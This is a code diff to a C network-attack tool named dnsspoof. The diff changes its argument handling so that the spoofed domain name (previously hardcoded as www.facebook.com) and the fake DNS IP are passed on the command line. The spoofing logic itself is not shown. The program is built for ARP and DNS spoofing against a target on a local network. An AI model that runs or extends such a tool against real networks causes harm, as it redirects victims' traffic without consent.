@@ -6,7 +6,7 @@
 
 void usage()
 {
-    fprintf(stderr, "Usage: ./dnsspoof <interface> <target> <gateway>\n");
+    fprintf(stderr, "Usage: ./dnsspoof <interface> <target> <gateway> <qname> <dns ip>\n");
     exit(0);
 }
 void* detect_ctrlD(void* interface){
@@ -29,24 +29,18 @@ void* detect_ctrlD(void* interface){
     }
 }
 int main(int argc, char** argv[]){
-    if(argc != 4)
+    if(argc != 6)
         usage();
 
     uint8_t *ip_target = (uint8_t*) calloc(4, sizeof(uint8_t));
     uint8_t *ip_gateway = (uint8_t*) calloc(4, sizeof(uint8_t));
-    char *qname = (char*) calloc(REQUEST_SIZE, sizeof(char));
     uint8_t* ip_dns_fake = (uint8_t*) calloc(4, sizeof(uint8_t));
 
-    /*tam thoi de IP cua VNU*/
-    *(ip_dns_fake) = 112; //0x70
-    *(ip_dns_fake+1) = 137; //0x89
-    *(ip_dns_fake+2) = 142; //0x8E
-    *(ip_dns_fake+3) = 4;   //0x04
-
-    memcpy(qname, "www.facebook.com", 16);
-
+ 
     char interface[IFNAMSIZ];
+    char qname[REQUEST_SIZE];
     strcpy(interface, argv[1]);
+
     sscanf(argv[2], "%hhd.%hhd.%hhd.%hhd",
                     (uint8_t *) ip_target,
                     (uint8_t *) (ip_target+1),
@@ -57,7 +51,13 @@ int main(int argc, char** argv[]){
                     (uint8_t *) (ip_gateway+1),
                     (uint8_t *) (ip_gateway+2),
                     (uint8_t *) (ip_gateway+3));     
+    strcpy(qname, argv[4]);
 
+    sscanf(argv[5], "%hhd.%hhd.%hhd.%hhd",
+                (uint8_t *) ip_dns_fake,
+                (uint8_t *) (ip_dns_fake+1),
+                (uint8_t *) (ip_dns_fake+2),
+                (uint8_t *) (ip_dns_fake+3));     
 
     int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); //this socket to get info about interface, not to catch packet
     if(fd < 0){
